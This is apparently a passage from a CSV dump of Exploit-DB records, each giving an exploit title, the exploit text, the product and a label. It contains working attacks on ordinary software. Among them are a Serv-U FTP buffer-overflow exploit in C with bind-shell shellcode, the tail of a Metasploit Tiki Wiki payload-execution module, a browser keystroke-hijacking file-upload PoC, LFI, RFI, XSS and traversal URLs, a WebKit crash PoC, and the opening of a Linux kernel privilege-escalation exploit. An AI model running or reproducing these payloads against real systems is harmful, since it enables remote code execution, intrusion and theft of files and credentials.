print_error(""#{@peer} - Exploit failed: #{res.code}. The Tiki Wiki Multiprint feature must be enabled."") 			return 		end  		print_status(""#{@peer} - Executing the payload #{@upload_php}"")  		res = send_request_cgi( 		{ 			'method' => 'GET', 			'uri'    => ""#{base + @upload_php}"", 			'headers' => { 				'Cmd' => Rex::Text.encode_base64(payload.encoded) 			} 		})  		if res 			print_error(""#{@peer} - Payload execution failed: #{res.code}"") 			return 		end  	end end",Tiki Wiki CMS Groupware,1
27987,"Mozilla Firefox 1.x - JavaScript Key Filtering source: https://www.securityfocus.com/bid/18308/info   Multiple web browsers are prone to a JavaScript key-filtering vulnerability because the browsers fail to securely handle keystroke input from users.   This issue is demonstrated to allow attackers to divert keystrokes from one input form in a webpage to a hidden file-upload dialog in the same page. This may allow remote attackers to initiate file uploads from unsuspecting users. Other attacks may also be possible.   Exploiting this issue requires that users manually type the full path of files that attackers wish to download. This may require substantial typing from targeted users, so attackers will likely use keyboard-based games, blogs, or other similar pages to entice users to enter the required keyboard input to exploit this issue.   Reportedly, Mozilla Suite, Mozilla Firefox, Mozilla SeaMonkey, Netscape Navigator, and Microsoft Internet Explorer are all vulnerable to this issue.   <HTML> <HEAD> <style type=""text/css""> .first { } .second {         color: white;         background-color: white;         opacity: 0; } </style> <SCRIPT> //document.onKeyDown = doKeyPress;  //document.onKeyUp = doKeyUp; var saved; var e ; var mystring = ""C:\\BOOT.INI""; //var i=mystring.length-1; var i=0; function doKeyPress(chucky)     {     saved = chucky.which;     //alert('pressed ' + String.fromCharCode(saved) + '(' + saved + ')');     if (mystring[i] != String.fromCharCode(saved).toUpperCase() ||         i > mystring.length-1) {        return false;     }     i++;     return true;   }; function doKeyUp () {  document.forms[0].txt.value += String.fromCharCode(saved); document.forms[0].txt.focus();  }  </SCRIPT> </HEAD> <BODY > <FORM METHOD=POST action=file.php> <INPUT id='asdf' name=""fileupload"" defaultValue='asdfasdf' TYPE=FILE OnKeyUp=""doKeyUp();"" OnKeyPress=""return doKeyPress(event);""> <input name=txt id='txt' type=text value='' OnKeyDown=""document.forms[0].fileupload.focus();"" onClick=""""> <input type=button value=""invisible"" onclick=""document.forms[0].fileupload.className='second';""> <input type=button value=""visible"" onclick=""document.forms[0].fileupload.className='first';"">  </FORM> </BODY> </HTML>",Mozilla Firefox,1
32806,Blue Utopia - 'index.php' Local File Inclusion source: https://www.securityfocus.com/bid/33851/info  Blue Utopia is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input.  An attacker can exploit this vulnerability to view and execute arbitrary local files in the context of the webserver process. This may aid in further attacks.   http://www.example.com/index.php?page=../../../../../../../../../../../../../../.. /../../../../../../../../../etc/passwd%00,Blue Utopia,1
822,"RhinoSoft Serv-U FTPd Server 4.x - 'site chmod' Remote Buffer Overflow #include <stdio.h> #include <sys/types.h> #include <sys/socket.h> #include <netinet/in.h>  #define exploit_length      511 #define NOP 'A'  #define SEH_handler_offset  400 char* SEH_handler     = ""\x41\x41\xEB\x04""; // 3) jmp over next four bytes char* retaddress_4004 = ""\xab\x1c\x5f\x01""; // 1) libeay32.015f1cab char* retaddress_4100 = ""\xcb\x1c\x41\x01""; // 1) ssleay32.01411ccb char* retaddress_4103 = ""\x8b\x1d\x41\x01""; // 1) ssleay32.01411d8b  char* shellcode =    ""\xeb\x43\x56\x57\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x52\x8b\x52""   ""\x20\x01\xea\x31\xc0\x31\xc9\x41\x8b\x34\x8a\x01\xee\x31\xff\xc1""   ""\xcf\x13\xac\x01\xc7\x85\xc0\x75\xf6\x39\xdf\x75\xea\x5a\x8b\x5a""   ""\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01""   ""\xe8\x5f\x5e\xff\xe0\xfc\x31\xc0\x64\x8b\x40\x30\x8b\x40\x0c\x8b""   ""\x70\x1c\xad\x8b\x68\x08\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32""   ""\x2e\x64\x68\x77\x73\x32\x5f\x54\xbb\x71\xa7\xe8\xfe\xe8\x90\xff""   ""\xff\xff\x89\xef\x89\xc5\x81\xc4\x70\xfe\xff\xff\x54\x31\xc0\xfe""   ""\xc4\x40\x50\xbb\x22\x7d\xab\x7d\xe8\x75\xff\xff\xff\x31\xc0\x50""   ""\x50\x50\x50\x40\x50\x40\x50\xbb\xa6\x55\x34\x79\xe8\x61\xff\xff""   ""\xff\x89\xc6\x31\xc0\x50\x50\x35\x02\x01\x70\xcc\xfe\xcc\x50\x89""   ""\xe0\x50\x6a\x10\x50\x56\xbb\x81\xb4\x2c\xbe\xe8\x42\xff\xff\xff""   ""\x31\xc0\x50\x56\xbb\xd3\xfa\x58\x9b\xe8\x34\xff\xff\xff\x58\x6a""   ""\x10\x54\x50\x56\xbb\x47\xf3\x56\xc6\xe8\x24\xff\xff\xff\x31\xdb""   ""\x53\x68\x2e\x63\x6d\x64\x89\xe1\x41\x50\x50\x50\x53\x53\x31\xc0""   ""\xfe\xc4\x40\x50\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x6a\x44""   ""\x89\xe6\x50\x55\x53\x53\x53\x53\x54\x56\x53\x53\x53\x43\x53\x4b""   ""\x53\x53\x51\x53\x89\xfd\xbb\x21\xd0\x05\xd0\xe8\xe2\xfe\xff\xff""   ""\x31\xc0\x48\x8b\x44\x24\x04\xbb\x43\xcb\x8d\x5f\xe8\xd1\xfe\xff""   ""\xff\x5d\x5d\x5d\xbb\x12\x6b\x6d\xd0\xe8\xc4\xfe\xff\xff\x31\xc0""   ""\x50\x89\xfd\xbb\x69\x1d\x42\x3a\xe8\xb5\xfe\xff\xff"";  int sock; FILE* FILEsock; int doubling;  void send_command(char *command, char *arguments) {   int i;   send(sock, command, strlen(command), 0);   send(sock, "" "", 1, 0);   for (i=0; i<strlen(arguments); i++) {     send(sock, arguments+i, 1, 0);     if (doubling && arguments[i] == '\xff') send(sock, arguments+i, 1, 0);   }   send(sock, ""\x0a\x0d"", 2, 0); }  int main(int argc, char *argv[], char *envp[]) {   struct sockaddr_in addr;   char *outbuffer, inbuffer[256];   char *retaddress = NULL;   char *version = NULL;    if (argc<5) {     printf(""Usage: %s IP PORT USERNAME PASSWORD [DIRECTORY]\n"", argv[0]);     exit(-1);   }    printf(""- Serv-ME ----------------------------------------------------\n""          ""  Serv-U v4.x \""site chmod\"" exploit.\n""          ""  Written by SkyLined <SkyLined@EduP.TUDelft.nl>.\n""          ""  Credits for the vulnerability go to ICBM <icbm@0x557.net>.\n""          ""  Thanks to H D Moore for the shellcode (www.metasploit.com).\n""          ""  Greets to everyone at 0dd and #netric.\n""          ""  (K)(L)(F) for Suzan.\n""          ""\n""          ""  Binds a shell at %s:28876 if successfull.\n""          ""  Tested with: v4.0.0.4, v4.1.0.0, v4.1.0.3 on W2K-EN.\n""          ""--------------------------------------------------------------\n"",            argv[1]);    addr.sin_family = AF_INET;   addr.sin_port = htons(atoi(argv[2]));   addr.sin_addr.s_addr = inet_addr(argv[1]);    printf(""\n[+] Connecting to %s:%s...\n"", argv[1], argv[2]);   if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {     perror(""Socket creation failed"");     exit(-1);   }   if (connect(sock, (struct sockaddr *)&addr, sizeof addr) == -1) {     perror(""Connection failed"");     exit(-1);   }   FILEsock = fdopen(sock, ""r"");   printf(""    --> %s"", fgets(inbuffer, sizeof inbuffer, FILEsock));   if (strstr(inbuffer, ""220 Serv-U FTP Server v4."") != inbuffer) {     printf(""[-] This is not a Serv-U v4.X ftp server.\n"");     exit(-1);   }   if (strstr(inbuffer, ""v4.1"") > 0) {     retaddress = retaddress_4103;     version = ""4.1.0.3"";   }    printf(""\n[+] Login in as %s:%s...\n"", argv[3], argv[4]);   send_command(""USER"", argv[3]);   printf(""    --> %s"", fgets(inbuffer, sizeof inbuffer, FILEsock));   send_command(""PASS"", argv[4]);   printf(""    --> %s"", fgets(inbuffer, sizeof inbuffer, FILEsock));   if (strstr(inbuffer, ""230"") != inbuffer) {     printf(""[-] Login failed.\n"");     exit(-1);   }    if (argv[5]) {     printf(""\n[+] Changing directory...\n"");     send_command(""CD"", argv[5]);     printf(""    --> %s"", fgets(inbuffer, sizeof inbuffer, FILEsock));   }    outbuffer = (char*) malloc(exploit_length + strlen(shellcode));   memset(outbuffer, NOP, exploit_length);   memcpy(outbuffer+exploit_length, shellcode, strlen(shellcode));    printf(""\n[+] Checking if \\xff doubling is nescesary: "");   send_command(""SITE CHMOD 477"", ""-\xff\xff-"");   fgets(inbuffer, sizeof inbuffer, FILEsock);   if (strchr(inbuffer, '\xff') == strrchr(inbuffer, '\xff')) {     doubling = 1;     printf(""Yes."");     retaddress = retaddress_4004;     version = ""4.0.0.4"";   } else {     printf(""No."");     if (retaddress==NULL) {       retaddress = retaddress_4100;       version = ""4.1.0.0"";     }   }   printf(""\n[+] Serv-U FTP server version %s: using retaddress 0x%08x"",                       version, *(int*)retaddress);   memcpy(outbuffer + SEH_handler_offset, SEH_handler, strlen(SEH_handler));   memcpy(outbuffer + SEH_handler_offset + 4, retaddress, strlen(retaddress));    printf(""\n[+] Sending exploit... "");   send_command(""SITE CHMOD 477"", outbuffer);   printf(""send, you can now try to connect to %s:28876.\n"", argv[1]);   printf(""    --> %s"", fgets(inbuffer, sizeof inbuffer, FILEsock));   close(socket);   printf(""\n[+] Done. \n""); }   // milw0rm.com [2004-01-30]",RhinoSoft Serv-U FTPd Server,1
19617,"NetcPlus SmartServer3 3.5.1 - POP Buffer Overflow source: https://www.securityfocus.com/bid/790/info  The POP server that is part of the NetcPlus SmartServer3 email server has an unchecked buffer that could allow an attacker to execute code on the server. If the USER command is followed by an argument of over 800 characters, the input buffer will be overflowed, and data from the argument will be passed to the system to be executed at the privelege level of the SmartServer program.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/19617.zip",NetcPlus SmartServer3,1
41216,"Apple WebKit - Type Confusion in RenderBox with Accessibility Enabled <!-- Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1038  There is a type confusion vulnerability that affects WebKit with accessibility enabled (WebCore::AXObjectCache::gAccessibilityEnabed).  PoC:  =============================== -->  <script> function boom() {   m.append(""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"");   m.setAttribute(""aria-labeledby"", ""t"");   d.open = false; } </script> <body onload=boom()> <title id=""t"">foo</title> <menu id=""m""> <details id=""d"" open=""true"">  <!-- ===============================   Bad cast happens in RenderBox.h in  inline RenderBox* RenderBox::firstChildBox() const {   return downcast<RenderBox>(firstChild()); }  The function expects that the first child is going to be of type RenderBox, but in the PoC it is actually of type RenderText.  This was tested on WebKitGTK+ 2.14.2 (latest stable version at this time). The PoC also crashes Safari on Mac, but only if the PoC is run while the Web Inspector / Error Console are enabled. It appears this behavior is caused by the fact that opening inspector enables accessibility features (via a call to AXObjectCache::enableAccessibility), while accessibility features are enabled in WebKitGTK+ by default through WebPageAccessibilityObjectAtk.  ASAN log follows.  ================================================================= ==5530==ERROR: AddressSanitizer: global-buffer-overflow on address 0x7fd724fdca78 at pc 0x7fd72289499f bp 0x7ffc9e7a40b0 sp 0x7ffc9e7a40a8 READ of size 8 at 0x7fd724fdca78 thread T0     #0 0x7fd72289499e in WebCore::RenderBox::computeBlockDirectionMargins(WebCore::RenderBlock const&, WebCore::LayoutUnit&, WebCore::LayoutUnit&) const /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBox.cpp:3260:21     #1 0x7fd7228a00b1 in WebCore::RenderBox::computeAndSetBlockDirectionMargins(WebCore::RenderBlock const&) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBox.cpp:3270:5     #2 0x7fd7227faa45 in WebCore::RenderBlockFlow::layoutBlockChild(WebCore::RenderBox&, WebCore::RenderBlockFlow::MarginInfo&, WebCore::LayoutUnit&, WebCore::LayoutUnit&) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlockFlow.cpp:660:5     #3 0x7fd7227f6abe in WebCore::RenderBlockFlow::layoutBlockChildren(bool, WebCore::LayoutUnit&) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlockFlow.cpp:632:9     #4 0x7fd7227f2d55 in WebCore::RenderBlockFlow::layoutBlock(bool, WebCore::LayoutUnit) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlockFlow.cpp:487:9     #5 0x7fd7227a24b7 in WebCore::RenderBlock::layout() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlock.cpp:1075:5     #6 0x7fd7227fb3a0 in WebCore::RenderBlockFlow::layoutBlockChild(WebCore::RenderBox&, WebCore::RenderBlockFlow::MarginInfo&, WebCore::LayoutUnit&, WebCore::LayoutUnit&) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlockFlow.cpp:709:9     #7 0x7fd7227f6abe in WebCore::RenderBlockFlow::layoutBlockChildren(bool, WebCore::LayoutUnit&) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlockFlow.cpp:632:9     #8 0x7fd7227f2d55 in WebCore::RenderBlockFlow::layoutBlock(bool, WebCore::LayoutUnit) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlockFlow.cpp:487:9     #9 0x7fd7227a24b7 in WebCore::RenderBlock::layout() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlock.cpp:1075:5     #10 0x7fd7227fb3a0 in WebCore::RenderBlockFlow::layoutBlockChild(WebCore::RenderBox&, WebCore::RenderBlockFlow::MarginInfo&, WebCore::LayoutUnit&, WebCore::LayoutUnit&) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlockFlow.cpp:709:9     #11 0x7fd7227f6abe in WebCore::RenderBlockFlow::layoutBlockChildren(bool, WebCore::LayoutUnit&) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlockFlow.cpp:632:9     #12 0x7fd7227f2d55 in WebCore::RenderBlockFlow::layoutBlock(bool, WebCore::LayoutUnit) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlockFlow.cpp:487:9     #13 0x7fd7227a24b7 in WebCore::RenderBlock::layout() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlock.cpp:1075:5     #14 0x7fd7227fb3a0 in WebCore::RenderBlockFlow::layoutBlockChild(WebCore::RenderBox&, WebCore::RenderBlockFlow::MarginInfo&, WebCore::LayoutUnit&, WebCore::LayoutUnit&) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlockFlow.cpp:709:9     #15 0x7fd7227f6abe in WebCore::RenderBlockFlow::layoutBlockChildren(bool, WebCore::LayoutUnit&) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlockFlow.cpp:632:9     #16 0x7fd7227f2d55 in WebCore::RenderBlockFlow::layoutBlock(bool, WebCore::LayoutUnit) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlockFlow.cpp:487:9     #17 0x7fd7227a24b7 in WebCore::RenderBlock::layout() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlock.cpp:1075:5     #18 0x7fd722c7d92f in WebCore::RenderView::layoutContent(WebCore::LayoutState const&) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderView.cpp:244:5     #19 0x7fd722c7ee64 in WebCore::RenderView::layout() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderView.cpp:370:9     #20 0x7fd72221b17b in WebCore::FrameView::layout(bool) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/page/FrameView.cpp:1438:9     #21 0x7fd721495fe2 in WebCore::Document::updateLayout() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/dom/Document.cpp:2007:9     #22 0x7fd7214a2801 in WebCore::Document::updateLayoutIgnorePendingStylesheets(WebCore::Document::RunPostLayoutTasks) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/dom/Document.cpp:2039:5     #23 0x7fd721579993 in WebCore::Element::innerText() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/dom/Element.cpp:2518:5     #24 0x7fd720c6d821 in WebCore::accessibleNameForNode(WebCore::Node*, WebCore::Node*) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/accessibility/AccessibilityNodeObject.cpp:1887:16     #25 0x7fd720c7695c in WebCore::AccessibilityNodeObject::accessibilityDescriptionForElements(WTF::Vector<WebCore::Element*, 0ul, WTF::CrashOnOverflow, 16ul>&) const /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/accessibility/AccessibilityNodeObject.cpp:1930:44     #26 0x7fd720c77102 in WebCore::AccessibilityNodeObject::ariaLabeledByAttribute() const /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/accessibility/AccessibilityNodeObject.cpp:1955:12     #27 0x7fd720c773e9 in WebCore::AccessibilityNodeObject::ariaAccessibilityDescription() const /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/accessibility/AccessibilityNodeObject.cpp:1166:28     #28 0x7fd720c773e9 in WebCore::AccessibilityNodeObject::hasAttributesRequiredForInclusion() const /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/accessibility/AccessibilityNodeObject.cpp:1963     #29 0x7fd720cc408b in WebCore::AccessibilityRenderObject::computeAccessibilityIsIgnored() const /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/accessibility/AccessibilityRenderObject.cpp:1356:9     #30 0x7fd720cac82c in WebCore::AccessibilityObject::accessibilityIsIgnored() const /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/accessibility/AccessibilityObject.cpp:2978:19     #31 0x7fd720cab793 in WebCore::AccessibilityObject::notifyIfIgnoredValueChanged() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/accessibility/AccessibilityObject.cpp:2870:22     #32 0x7fd72279df02 in WebCore::RenderBlock::makeChildrenNonInline(WebCore::RenderObject*) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlock.cpp:707:5     #33 0x7fd72279d37a in WebCore::RenderBlock::addChildIgnoringContinuation(WebCore::RenderObject*, WebCore::RenderObject*) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlock.cpp:606:9     #34 0x7fd722eb34fa in WebCore::RenderTreePosition::insert(WebCore::RenderObject&) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/style/RenderTreePosition.h:93:5     #35 0x7fd722eb34fa in WebCore::RenderTreeUpdater::createRenderer(WebCore::Element&, WebCore::RenderStyle&&) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/style/RenderTreeUpdater.cpp:370     #36 0x7fd722eaec96 in WebCore::RenderTreeUpdater::updateElementRenderer(WebCore::Element&, WebCore::Style::ElementUpdate&) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/style/RenderTreeUpdater.cpp:283:9     #37 0x7fd722eac9ad in WebCore::RenderTreeUpdater::updateRenderTree(WebCore::ContainerNode&) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/style/RenderTreeUpdater.cpp:173:9     #38 0x7fd722eabdcf in WebCore::RenderTreeUpdater::commit(std::unique_ptr<WebCore::Style::Update, std::default_delete<WebCore::Style::Update> >) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/style/RenderTreeUpdater.cpp:120:9     #39 0x7fd7214a045e in WebCore::Document::recalcStyle(WebCore::Style::Change) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/dom/Document.cpp:1936:13     #40 0x7fd7214a1a4f in WebCore::Document::updateStyleIfNeeded() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/dom/Document.cpp:1982:5     #41 0x7fd7214a1a4f in WebCore::Document::implicitClose() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/dom/Document.cpp:2807     #42 0x7fd721f666e8 in WebCore::FrameLoader::checkCallImplicitClose() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/loader/FrameLoader.cpp:870:5     #43 0x7fd721f666e8 in WebCore::FrameLoader::checkCompleted() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/loader/FrameLoader.cpp:816     #44 0x7fd721f6101a in WebCore::FrameLoader::finishedParsing() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/loader/FrameLoader.cpp:737:5     #45 0x7fd7214da906 in WebCore::Document::finishedParsing() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/dom/Document.cpp:5228:9     #46 0x7fd721c66aca in WebCore::HTMLDocumentParser::end() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/html/parser/HTMLDocumentParser.cpp:406:5     #47 0x7fd721c66aca in WebCore::HTMLDocumentParser::attemptToRunDeferredScriptsAndEnd() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/html/parser/HTMLDocumentParser.cpp:415     #48 0x7fd721c66aca in WebCore::HTMLDocumentParser::prepareToStopParsing() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/html/parser/HTMLDocumentParser.cpp:135     #49 0x7fd721f480d3 in WebCore::DocumentWriter::end() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/loader/DocumentWriter.cpp:269:5     #50 0x7fd721f20e29 in WebCore::DocumentLoader::finishedLoading(double) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/loader/DocumentLoader.cpp:442:5     #51 0x7fd721f2a031 in WebCore::DocumentLoader::continueAfterContentPolicy(WebCore::PolicyAction) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/loader/DocumentLoader.cpp:829:13     #52 0x7fd721f25361 in WebCore::DocumentLoader::responseReceived(WebCore::CachedResource*, WebCore::ResourceResponse const&) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/loader/DocumentLoader.cpp:711:9     #53 0x7fd721f1b2a9 in WebCore::DocumentLoader::handleSubstituteDataLoadNow() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/loader/DocumentLoader.cpp:477:5     #54 0x7fd722434521 in WebCore::ThreadTimers::sharedTimerFiredInternal() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/platform/ThreadTimers.cpp:121:9     #55 0x7fd71f10ff1b in WTF::RunLoop::TimerBase::TimerBase(WTF::RunLoop&)::$_3::operator()(void*) const /home/ifratric/webkit/webkitgtk-2.14.2/Source/WTF/wtf/glib/RunLoopGLib.cpp:162:9     #56 0x7fd71f10ff1b in WTF::RunLoop::TimerBase::TimerBase(WTF::RunLoop&)::$_3::__invoke(void*) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WTF/wtf/glib/RunLoopGLib.cpp:160     #57 0x7fd717fcf059 in g_main_context_dispatch (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x4a059)     #58 0x7fd717fcf3ff  (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x4a3ff)     #59 0x7fd717fcf721 in g_main_loop_run (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x4a721)     #60 0x7fd71f10f384 in WTF::RunLoop::run() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WTF/wtf/glib/RunLoopGLib.cpp:94:9     #61 0x7fd7208b6f98 in int WebKit::ChildProcessMain<WebKit::WebProcess, WebKit::WebProcessMain>(int, char**) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebKit2/Shared/unix/ChildProcessMain.h:61:5     #62 0x7fd71378b82f in __libc_start_main /build/glibc-GKVZIf/glibc-2.23/csu/../csu/libc-start.c:291     #63 0x41a218 in _start (/webkit/libexec/webkit2gtk-4.0/WebKitWebProcess+0x41a218)  0x7fd724fdca78 is located 272 bytes to the right of global variable 'vtable for WebCore::RenderText' defined in '/home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderText.cpp' (0x7fd724fdc400) of size 1384 SUMMARY: AddressSanitizer: global-buffer-overflow /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBox.cpp:3260:21 in WebCore::RenderBox::computeBlockDirectionMargins(WebCore::RenderBlock const&, WebCore::LayoutUnit&, WebCore::LayoutUnit&) const Shadow bytes around the buggy address:   0x0ffb649f38f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x0ffb649f3900: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x0ffb649f3910: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x0ffb649f3920: 00 00 00 00 00 00 00 00 00 00 00 00 00 f9 f9 f9   0x0ffb649f3930: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 =>0x0ffb649f3940: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9[f9]   0x0ffb649f3950: f9 f9 f9 f9 f9 f9 f9 f9 00 00 00 00 00 00 f9 f9   0x0ffb649f3960: f9 f9 f9 f9 00 00 00 00 00 00 00 00 00 00 00 00   0x0ffb649f3970: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x0ffb649f3980: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x0ffb649f3990: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes):   Addressable:           00   Partially addressable: 01 02 03 04 05 06 07    Heap left redzone:       fa   Heap right redzone:      fb   Freed heap region:       fd   Stack left redzone:      f1   Stack mid redzone:       f2   Stack right redzone:     f3   Stack partial redzone:   f4   Stack after return:      f5   Stack use after scope:   f8   Global redzone:          f9   Global init order:       f6   Poisoned by user:        f7   Container overflow:      fc   Array cookie:            ac   Intra object redzone:    bb   ASan internal:           fe   Left alloca redzone:     ca   Right alloca redzone:    cb ==5530==ABORTING -->",Apple WebKit,1
17694,network tracker .95 - Persistent Cross-Site Scripting # Exploit Title: Network Tracker .95 Stored XSS # Date: 08-18-2011 # Author: G13 # Software link: http://networktracker.org/ # Version: .95  ISSUE  The application contains a option which allows anyone to create a user.  If this option is left enabled an attacker could launch a stored XSS  attack against the vulnerable application  Vulnerability:  Network Tracker does not escape the data entry on the Description and  Brand fields of a device.  An attacker may enter  <script>alert(100);</script> into these fields to cause the exploit.,network tracker,1
25924,fsboard 2.0 - Directory Traversal source: https://www.securityfocus.com/bid/14111/info  FSboard is prone to a directory traversal vulnerability.  This could allow a remote attacker to read files outside the Web root. This could only be used to access files to which the Web server has permission.  All versions of FSboard are vulnerable to this issue at the moment.   http://www.example.com/forum/default.asp?db=general&mode=download&idx=507&fileNum=1&filename=../conf.asp&nav=viewcontents&srhctgr=&srhstr=&page=1,fsboard,1
3598,"MangoBery CMS 0.5.5 - 'quotes.php' Remote File Inclusion Mangobery-0.5.5  ***************** Found by kezzap66345 * ***************** Script Page:http://mangobery.sourceforge.net/ ***************** Demo Site:http://mangobery.beryllium.ca/ ***************** Script Download:http://sourceforge.net/project/showfiles.php?group_id=63834&package_id=60858  ***************** Dork:http://www.google.com.tr/search?hl=tr&q=%22MangoBery+1.0+Alpha%22&meta=  ***************** ERROR#1: File:boxes/quotes.php *****************   <? include($Site_Path . 'tquotes/tq_getquote.inc') ?>     <<< rfi coded   ************************************************************************************** RFI#1:  http://SITE.com/path/boxes/quotes.php?Site_Path=[SHELL]   **************************************************************************************  ***************** ERROR#2: File:templates/mangobery/footer.sample.php *****************   include($Site_Path . ""includes/column_right.php"");     <<< rfi coded   ************************************************************************************** RFI#2:  http://SITE.com/path/templates/mangobery/footer.sample.php?Site_Path=[SHELL]  Thanks:Siircicocuk and x0r0n ************************************************************************************** ************************************************************************************** ************************************************************************************** ************************************************************************************** ******Thanx****SiiRCiCOCUK****str0ke**************************************************  # milw0rm.com [2007-03-28]",MangoBery CMS,1
26356,MySource 2.14 - 'insert_table.php?bgcolor' Cross-Site Scripting source: https://www.securityfocus.com/bid/15132/info   MySource is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.   An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. These may facilitate the theft of cookie-based authentication credentials as well as other attacks.   http://www.example.com/squizlib/bodycopy/pop_ups/insert_table.php?bgcolor=</style>[code],MySource,1
2013,"Linux Kernel 2.6.17.4 - 'proc' Local Privilege Escalation /* ** Author: h00lyshit ** Vulnerable: Linux 2.6 ALL ** Type of Vulnerability: Local Race ** Tested On : various distros ** Vendor Status: unknown ** ** Disclaimer: ** In no event shall the author be liable for any damages ** whatsoever arising out of or in connection with the use ** or spread of this information. ** Any use of this information is at the user's own risk. ** ** Compile: ** gcc h00lyshit.c -o h00lyshit ** ** Usage: ** h00lyshit <very big file on the disk> ** ** Example: ** h00lyshit /usr/X11R6/lib/libethereal.so.0.0.1 ** ** if y0u dont have one, make big file (~100MB) in /tmp with dd ** and try to junk the cache e.g. cat /usr/lib/* >/dev/null ** */  #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> #include <fcntl.h> #include <errno.h> #include <sched.h> #include <sys/types.h> #include <sys/stat.h> #include <sys/prctl.h> #include <sys/mman.h> #include <sys/wait.h> #include <linux/a.out.h> #include <asm/unistd.h>   static struct exec ex; static char *e[256]; static char *a[4]; static char b[512]; static char t[256]; static volatile int *c;   /*	h00lyshit shell code		